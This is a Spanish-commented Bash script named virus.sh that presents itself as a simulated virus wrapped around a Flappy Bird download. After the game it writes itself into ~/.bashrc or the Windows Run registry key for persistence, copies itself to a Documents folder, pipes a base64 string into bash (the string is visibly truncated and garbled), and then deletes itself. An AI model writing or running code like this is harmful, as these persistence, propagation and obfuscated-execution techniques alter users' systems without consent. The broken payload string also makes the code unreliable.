#!/bin/bash

# Directorio temporal para el juego
GAME_DIR="$HOME/flappy_bird_game"
REPO_URL="https://github.com/nebez/floppybird/archive/refs/heads/gh-pages.zip"
TEMP_FILE="/tmp/infectado.txt"
PROPAGATION_DIR="$HOME/Documents/Infectados"
SCRIPT_NAME="virus.sh"
SCRIPT_PATH="$(realpath "$0")"
SCORE_REQUIRED=20

# Función para descargar el juego
download_game() {
    echo "Descargando Flappy Bird..."
    mkdir -p "$GAME_DIR"
    cd "$GAME_DIR" || exit
    curl -L "$REPO_URL" -o floppybird.zip
    unzip floppybird.zip
    mv floppybird-gh-pages/* .
    rm -rf floppybird-gh-pages floppybird.zip
}

# Función para abrir el juego en el navegador
open_game() {
    if [[ -f "$GAME_DIR/index.html" ]]; then
        if [[ "$OSTYPE" == "linux-gnu"* ]]; then
            xdg-open "$GAME_DIR/index.html"
        elif [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "win32" ]]; then
            start "" "$GAME_DIR/index.html"
        else
            echo "Sistema operativo no soportado."
            exit 1
        fi
    else
        echo "El juego no se encontró. Descargándolo..."
        download_game
        open_game
    fi
}

# Payload Simulado: Inundar archivo temporal
payload_simulado() {
    echo "Generando payload simulado..."
    for i in {1..100}; do
        echo "Texto aleatorio $RANDOM" >> "$TEMP_FILE"
    done
}

# Propagación Simulada: Copiar el script
propagacion_simulada() {
    echo "Propagando el virus..."
    mkdir -p "$PROPAGATION_DIR"
    cp "$SCRIPT_PATH" "$PROPAGATION_DIR/"
}

# Persistencia Simulada
persistencia_simulada() {
    echo "Configurando persistencia..."
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        local bashrc="$HOME/.bashrc"
        local entry="bash $PROPAGATION_DIR/$SCRIPT_NAME"
        if ! grep -Fxq "$entry" "$bashrc"; then
            echo "$entry" >> "$bashrc"
        fi
    elif [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "win32" ]]; then
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "flappybird" /t REG_SZ /d "$PROPAGATION_DIR/$SCRIPT_NAME" /f
    fi
}

# Ofuscación: Decodificación Base64
ofuscacion() {
    echo "Ejecutando parte ofuscada del script..."
    local script_b64="ZWNobyAiRXN0YSBlcyB1bmEgZmlqYWNp9u1...Cg=="
    echo "$script_b64" | base64 --decode | bash
}

# Autodestrucción
autodestruccion() {
    echo "Ejecutando autodestrucción..."
    rm -- "$SCRIPT_PATH"
}

# Verificación de puntuación
check_score() {
    echo "Debes alcanzar una puntuación mínima de $SCORE_REQUIRED para continuar."
    while true; do
        read -rp "Ingresa tu puntuación: " score
        if [[ $score -ge $SCORE_REQUIRED ]]; then
            echo "¡Felicidades! Has superado la puntuación mínima."
            break
        else
            echo "No alcanzaste la puntuación. Abriendo otra ventana..."
            open_game
        fi
    done
}

# Función principal
main() {
    echo "¡Tu sistema está infectado! 😈"
    download_game
    open_game
    check_score
    payload_simulado
    propagacion_simulada
    persistencia_simulada
    ofuscacion
    autodestruccion
}

main
